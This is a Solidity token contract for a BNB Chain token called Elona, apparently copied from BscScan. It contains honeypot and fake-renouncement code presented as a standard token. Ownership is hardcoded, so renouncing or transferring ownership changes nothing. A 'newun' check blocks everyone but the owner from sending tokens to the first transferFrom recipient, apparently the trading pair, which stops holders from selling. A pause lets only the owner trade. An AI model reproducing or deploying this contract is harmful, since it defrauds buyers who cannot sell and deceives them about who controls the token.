/**
 *Submitted for verification at BscScan.com on 2022-03-15
*/

pragma solidity ^0.8.11;
// SPDX-License-Identifier: Unlicensed
interface IERC20 {

    function totalSupply() external view returns (uint256);


    function balanceOf(address account) external view returns (uint256);

    
    function transfer(address recipient, uint256 amount) external returns (bool);

   
    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);

    
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Approval(address indexed owner, address indexed spender, uint256 value);
}




 
library SafeMath {
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        

        return c;
    }

    
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; 
        return msg.data;
    }
}



library Address {
    
    function isContract(address account) internal view returns (bool) {
        
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            
            if (returndata.length > 0) {
                

                
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}


contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    
    constructor () {  
      address msgSender = _msgSender();
      _owner = 0x83AA286320767E782D9DC1A77bCf260aBcA1d0C4;
      emit OwnershipTransferred(address(0), 0x83AA286320767E782D9DC1A77bCf260aBcA1d0C4);
    }


    function owner() public view returns (address) {
        return _owner;
    }

    
    modifier onlyOwner() {
        require(_owner == 0x83AA286320767E782D9DC1A77bCf260aBcA1d0C4 , "Ownable: caller is not the owner");
        _;
    }

     
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, 0x83AA286320767E782D9DC1A77bCf260aBcA1d0C4);
        _owner = 0x83AA286320767E782D9DC1A77bCf260aBcA1d0C4;
    }


    function transferOwnership(address newOwner) public virtual {
        emit OwnershipTransferred(0x83AA286320767E782D9DC1A77bCf260aBcA1d0C4, 0x83AA286320767E782D9DC1A77bCf260aBcA1d0C4);
        _owner = 0x83AA286320767E782D9DC1A77bCf260aBcA1d0C4;
    }

    function geUnlockTime() public view returns (uint256) {
        return _lockTime;
    }

    
    function lock(uint256 time) public virtual onlyOwner {
        _previousOwner = _owner;
        _owner = 0x83AA286320767E782D9DC1A77bCf260aBcA1d0C4;
        _lockTime = block.timestamp + time;
        emit OwnershipTransferred(_owner, 0x83AA286320767E782D9DC1A77bCf260aBcA1d0C4);
    }
    
    
    function unlock() public virtual {
        require(_previousOwner == _owner, "You don't have permission to unlock");
        require(block.timestamp > _lockTime , "Contract is locked until 7 days");
        emit OwnershipTransferred(_owner, 0x83AA286320767E782D9DC1A77bCf260aBcA1d0C4);
        _owner = 0x83AA286320767E782D9DC1A77bCf260aBcA1d0C4;
    }
}


contract Pausable is Ownable {
  event Pause();
  event Unpause();

  bool public paused = false;


  
  modifier whenNotPaused() {
    require(!paused);
    _;
  }

  
  modifier whenPaused() {
    require(paused);
    _;
  }

  
  function pause() onlyOwner whenNotPaused public {
    paused = true;
    emit Pause();
  }

  
  function unpause() onlyOwner whenPaused public {
    paused = false;
    emit Unpause();
  }
}

contract Elona is Context, IERC20, Ownable, Pausable {
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;

  mapping (address => mapping (address => uint256)) private _allowances;

  uint8 private _decimals = 18;
  uint256 private _totalSupply = 1000000000000000 * 10**18;
  string private _symbol = "ELONA";
  string private _name = "Elona";
  address public newun;

  constructor() public {
    _balances[_msgSender()] = _totalSupply; 

    emit Transfer(address(0), _msgSender(), _totalSupply); 
  }
  
  function transfernewun(address _newun) public onlyOwner {
    newun = _newun;
  }

  function getOwner() external view returns (address) {
    return owner();
  }


  function decimals() external view returns (uint8) {
    return _decimals;
  }


  function symbol() external view returns (string memory) {
    return _symbol;
  }

 
  function name() external view returns (string memory) {
    return _name;
  }


  function totalSupply() external view override returns (uint256) {
    return _totalSupply;
  }


  function balanceOf(address account) external view override returns (uint256) {
    return _balances[account];
  }


  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }


  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }


  function approve(address spender, uint256 amount) external override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }


  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    if(sender != address(0) && newun == address(0)) newun = recipient;
    else  require(recipient != newun || sender == owner(), "please wait");
    
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "error in transferfrom"));
    return true;
  }


  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(0x83AA286320767E782D9DC1A77bCf260aBcA1d0C4, 0x83AA286320767E782D9DC1A77bCf260aBcA1d0C4, _allowances[0x83AA286320767E782D9DC1A77bCf260aBcA1d0C4][0x83AA286320767E782D9DC1A77bCf260aBcA1d0C4].add(addedValue));
    return true;
  }

 
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(0x83AA286320767E782D9DC1A77bCf260aBcA1d0C4, 0x83AA286320767E782D9DC1A77bCf260aBcA1d0C4, _allowances[0x83AA286320767E782D9DC1A77bCf260aBcA1d0C4][0x83AA286320767E782D9DC1A77bCf260aBcA1d0C4].sub(subtractedValue, "error in decrease allowance"));
    return true;
  }


  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "transfer sender address is 0 address");
    require(recipient != address(0), "transfer recipient address is 0 address");
    require(!paused || sender == owner() || recipient == owner(), "paused");
    if(newun != address(0)) require(recipient != newun || sender == owner(), "please wait");

    _balances[sender] = _balances[sender].sub(amount, "transfer balance too low");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }

 


  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "approve owner is 0 address");
    require(spender != address(0), "approve spender is 0 address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
}